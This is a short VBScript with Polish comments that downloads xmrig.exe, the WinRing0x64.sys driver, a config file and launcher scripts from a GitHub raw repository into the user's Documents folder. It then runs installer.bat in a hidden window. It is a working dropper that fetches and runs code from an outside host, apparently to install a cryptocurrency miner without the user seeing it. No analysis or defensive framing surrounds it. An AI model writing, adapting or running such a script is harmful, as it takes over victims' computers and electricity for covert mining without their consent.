Option Explicit

Dim fso, shell, objXMLHTTP, adoStream
Dim folderPath, urls, fileName, i

folderPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERPROFILE%") & "\Documents\files"

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' Utwórz folder jeśli nie istnieje
If Not fso.FolderExists(folderPath) Then
    fso.CreateFolder(folderPath)
End If

' Lista plików do pobrania (URL bezpośredni do raw github)
Dim filesToDownload
filesToDownload = Array( _
    "https://raw.githubusercontent.com/Michalsonix/kopcia/main/WinRing0x64.sys", _
    "https://raw.githubusercontent.com/Michalsonix/kopcia/main/config.json", _
    "https://raw.githubusercontent.com/Michalsonix/kopcia/main/installer.bat", _
    "https://raw.githubusercontent.com/Michalsonix/kopcia/main/start.cmd", _
    "https://raw.githubusercontent.com/Michalsonix/kopcia/main/start.vbs", _
    "https://raw.githubusercontent.com/Michalsonix/kopcia/main/xmrig.exe" _
)

' Pobierz każdy plik
For i = 0 To UBound(filesToDownload)
    fileName = Mid(filesToDownload(i), InStrRev(filesToDownload(i), "/") + 1)
    DownloadFile filesToDownload(i), folderPath & "\" & fileName
Next

' Uruchom installer.bat ukrytym oknem
shell.CurrentDirectory = folderPath
shell.Run "installer.bat", 0, False

' --- funkcja do pobierania plików ---
Sub DownloadFile(URL, LocalFile)
    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    objXMLHTTP.Open "GET", URL, False
    objXMLHTTP.Send

    If objXMLHTTP.Status = 200 Then
        Set adoStream = CreateObject("ADODB.Stream")
        adoStream.Type = 1 'binary
        adoStream.Open
        adoStream.Write objXMLHTTP.ResponseBody
        adoStream.SaveToFile LocalFile, 2 'overwrite
        adoStream.Close
    Else
        ' coś poszło nie tak, możesz tu dodać log albo komunikat
    End If
End Sub
